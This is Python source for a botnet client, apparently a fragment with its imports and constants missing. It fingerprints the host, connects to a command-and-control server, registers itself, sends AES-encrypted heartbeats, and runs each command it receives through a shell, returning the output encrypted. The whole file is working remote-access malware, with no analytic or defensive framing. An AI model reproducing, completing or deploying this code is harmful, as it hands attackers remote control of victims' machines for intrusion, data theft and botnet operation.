class BotClient:
    def __init__(self):
        self.bot_id = self.generate_bot_id()
        self.running = True
        self.socket = None

    def generate_bot_id(self):
        system_info = f"{platform.node()}-{platform.system()}-{platform.release()}"
        return hashlib.sha256(system_info.encode()).hexdigest()[:16]

    def encrypt(self, plaintext):
        cipher = AES.new(SECRET_KEY, AES.MODE_CBC, IV)
        padded_text = pad(plaintext.encode(), AES.block_size)
        encrypted = cipher.encrypt(padded_text)
        return base64.b64encode(encrypted).decode()

    def decrypt(self, ciphertext):
        cipher = AES.new(SECRET_KEY, AES.MODE_CBC, IV)
        decoded = base64.b64decode(ciphertext.encode())
        decrypted = cipher.decrypt(decoded)
        return unpad(decrypted, AES.block_size).decode()

    def execute_command(self, command):
        try:
            result = subprocess.check_output(
                command, 
                shell=True, 
                stderr=subprocess.STDOUT,
                timeout=30
            )
            return result.decode('utf-8', errors='replace')
        except subprocess.CalledProcessError as e:
            return e.output.decode('utf-8', errors='replace')
        except Exception as e:
            return str(e)

    def send_heartbeat(self):
        while self.running:
            try:
                if self.socket:
                    message = json.dumps({
                        'type': 'heartbeat',
                        'bot_id': self.bot_id
                    })
                    encrypted = self.encrypt(message)
                    self.socket.send(encrypted.encode())
            except Exception as e:
                print(f"[-] Heartbeat error: {e}")
                self.reconnect()
            time.sleep(HEARTBEAT_INTERVAL)

    def reconnect(self):
        self.connect_to_c2()

    def connect_to_c2(self):
        while self.running:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((C2_SERVER, C2_PORT))

                # Register with C2
                message = json.dumps({
                    'type': 'register',
                    'bot_id': self.bot_id,
                    'system': platform.system(),
                    'hostname': platform.node()
                })
                encrypted = self.encrypt(message)
                self.socket.send(encrypted.encode())
                return True

            except Exception as e:
                print(f"[-] Connection error: {e}")
                time.sleep(10)  # Wait before retrying
                continue

    def handle_commands(self):
        while self.running:
            try:
                if self.socket:
                    data = self.socket.recv(4096)
                    if not data:
                        self.reconnect()
                        continue

                    decrypted = self.decrypt(data.decode())
                    message = json.loads(decrypted)

                    if message['type'] == 'command':
                        print(f"[*] Received command: {message['command']}")
                        output = self.execute_command(message['command'])

                        response = json.dumps({
                            'type': 'response',
                            'bot_id': self.bot_id,
                            'data': output
                        })
                        encrypted = self.encrypt(response)
                        self.socket.send(encrypted.encode())

            except Exception as e:
                print(f"[-] Command handling error: {e}")
                self.reconnect()
                continue

    def start(self):
        if self.connect_to_c2():
            print(f"[*] Connected to C2 server as {self.bot_id}")

            # Start heartbeat thread
            heartbeat_thread = threading.Thread(target=self.send_heartbeat)
            heartbeat_thread.daemon = True
            heartbeat_thread.start()

            # Start command handling
            self.handle_commands()

if __name__ == "__main__":
    bot = BotClient()
    bot.start()
